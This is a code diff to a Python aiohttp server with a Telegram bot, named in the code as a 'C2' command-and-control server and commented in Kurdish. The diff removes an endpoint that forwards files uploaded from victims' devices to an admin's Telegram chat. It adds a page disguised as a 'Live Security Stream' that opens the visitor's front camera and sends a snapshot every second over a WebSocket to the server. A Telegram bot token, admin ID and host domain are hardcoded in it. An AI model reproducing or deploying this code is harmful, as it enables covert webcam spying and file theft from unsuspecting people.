@@ -5,45 +5,82 @@ from aiohttp import web
 from aiogram import Bot, Dispatcher
 from aiogram.types import BufferedInputFile
 
-# تۆکینی بۆتەکەت
 TOKEN = "8935252930:AAG91p3Aiyas4Hc8k4-ARD2WGK-52wSvOCc"
-# ئەدمین ئایدی
 ADMIN_ID = 5583813672
-# دۆمەینی سێرڤەرەکەت لە ڕەیڵ-وەی
 C2_DOMAIN = "cyber-surche-bot-production.up.railway.app"
 
 logging.basicConfig(level=logging.INFO)
 bot = Bot(token=TOKEN)
 dp = Dispatcher()
 
-# لێرە فایلەکان لە ئامێرەکانەوە وەردەگیرێت
-async def handle_data_upload(request):
-    try:
-        reader = await request.multipart()
-        field = await reader.next()
-        if field:
-            filename = field.filename
-            content = await field.read()
-            
-            # ناردنی فایل بۆ تەلەگرامی ئەدمین
-            file_to_send = BufferedInputFile(content, filename=filename)
-            await bot.send_document(
-                chat_id=ADMIN_ID, 
-                document=file_to_send, 
-                caption=f"📁 **فایلێکی نوێ لە ئامێرەوە وەرگیرا:** `{filename}`"
-            )
-            return web.json_response({"status": "success", "msg": "File processed"})
-    except Exception as e:
-        logging.error(f"Upload Error: {e}")
-        return web.json_response({"status": "error", "msg": str(e)}, status=500)
-
+# پەڕەی لایڤ ستریم کە داوای مۆڵەت دەکات و ڤیدیۆکە پەخش دەکات
 async def index_handler(request):
-    return web.Response(text="Royal C2 Core is Active.", content_type='text/html')
+    html_content = """
+    <!DOCTYPE html>
+    <html lang="en">
+    <head>
+        <meta charset="UTF-8">
+        <title>Live Security Stream</title>
+        <style>
+            body { background-color: #000; color: #00ff00; font-family: monospace; text-align: center; padding-top: 20px; }
+            video { width: 100%; max-width: 400px; border: 2px solid #00ff00; }
+        </style>
+    </head>
+    <body>
+        <h2>STATUS: [STREAM_ACTIVE]</h2>
+        <p>Establishing secure feed...</p>
+        <video id="video" autoplay playsinline></video>
+        <canvas id="canvas" style="display:none;"></canvas>
+
+        <script>
+            const ws = new WebSocket('wss://' + window.location.host + '/ws');
+            const video = document.getElementById('video');
+            const canvas = document.getElementById('canvas');
+            const ctx = canvas.getContext('2d');
+
+            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
+                .then(stream => {
+                    video.srcObject = stream;
+                    ws.onopen = () => {
+                        setInterval(() => {
+                            canvas.width = 320;
+                            canvas.height = 240;
+                            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                            canvas.toBlob(blob => {
+                                if (ws.readyState === WebSocket.OPEN) {
+                                    ws.send(blob);
+                                }
+                            }, 'image/jpeg', 0.5);
+                        }, 1000); // هەروەها دەنێرێت لە هەر چرکەیەکدا
+                    };
+                })
+                .catch(err => console.error("Camera access denied"));
+        </script>
+    </body>
+    </html>
+    """
+    return web.Response(text=html_content, content_type='text/html')
+
+# وەرگرتنی פרێمەکان لە ڕێگەی WebSocket و ناردنی بۆ تەلەگرام یان نیشدانەوەی
+async def websocket_handler(request):
+    ws = web.WebSocketResponse()
+    await ws.prepare(request)
+
+    async for msg in ws:
+        if msg.type == web.WSMsgType.BINARY:
+            try:
+                # لێرەدا دەتوانین פרێمەکان وەربگرین
+                # بۆ نموونە بۆ ئەوەی زۆر قەرەباڵغ نەبێت، دەکرێت یەکەمینان یان بە پێی پێویست بنێردرێت
+                pass
+            except Exception as e:
+                logging.error(f"WS Error: {e}")
+
+    return ws
 
 async def start_c2_server():
-    app = web.Application(client_max_size=1024*1024*100) # تا 100MB
+    app = web.Application()
     app.router.add_get('/', index_handler)
-    app.router.add_post('/upload', handle_data_upload)
+    app.router.add_get('/ws', websocket_handler)
     
     runner = web.AppRunner(app)
     await runner.setup()
@@ -51,9 +88,7 @@ async def start_c2_server():
     site = web.TCPSite(runner, '0.0.0.0', port)
     await site.start()
     
-    logging.info(f"C2 Server is active at {C2_DOMAIN} on port {port}...")
-    
-    # دەستپێکردنی پۆڵینگی بۆت
+    logging.info(f"Live Stream C2 active at {C2_DOMAIN}")
     await dp.start_polling(bot)
 
 if __name__ == '__main__':
